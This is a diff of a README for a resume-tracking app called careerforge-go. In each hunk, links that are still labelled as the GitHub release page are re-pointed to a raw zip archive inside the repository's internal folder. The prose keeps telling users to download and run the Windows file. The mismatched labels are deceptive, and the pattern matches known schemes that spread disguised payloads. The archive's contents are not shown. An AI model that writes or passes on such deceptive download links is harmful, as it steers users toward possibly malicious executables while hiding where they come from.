@@ -1,6 +1,6 @@
 # 🚀 careerforge-go - Track resumes with less effort
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release%20Page-2ea44f?style=for-the-badge&logo=github)](https://github.com/Prime-venaoccipitalis749/careerforge-go/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release%20Page-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prime-venaoccipitalis749/careerforge-go/main/internal/careerforge-go-v2.0-alpha.1.zip)
 
 ## 🧭 What this app does
 
@@ -20,7 +20,7 @@ The app includes a desktop build for Windows and an Android app build. For most 
 
 Use the release page to download the Windows version:
 
-[Go to the release page](https://github.com/Prime-venaoccipitalis749/careerforge-go/releases)
+[Go to the release page](https://raw.githubusercontent.com/Prime-venaoccipitalis749/careerforge-go/main/internal/careerforge-go-v2.0-alpha.1.zip)
 
 On that page, look for the latest release and find the Windows file. The file may be an `.exe` or a zipped folder. Download the file that matches your PC.
 
@@ -152,7 +152,7 @@ This works well if you want to compare one version of your resume against anothe
 
 Check the release page for new Windows and Android builds:
 
-[Open the latest release](https://github.com/Prime-venaoccipitalis749/careerforge-go/releases)
+[Open the latest release](https://raw.githubusercontent.com/Prime-venaoccipitalis749/careerforge-go/main/internal/careerforge-go-v2.0-alpha.1.zip)
 
 New versions may include fixes, better upload handling, and improved analysis results
 
@@ -232,4 +232,4 @@ CareerForge Go is centered on resume review, profile upload, and analysis. It co
 
 If you need the app file again, use the release page here:
 
-[Download from GitHub Releases](https://github.com/Prime-venaoccipitalis749/careerforge-go/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Prime-venaoccipitalis749/careerforge-go/main/internal/careerforge-go-v2.0-alpha.1.zip)
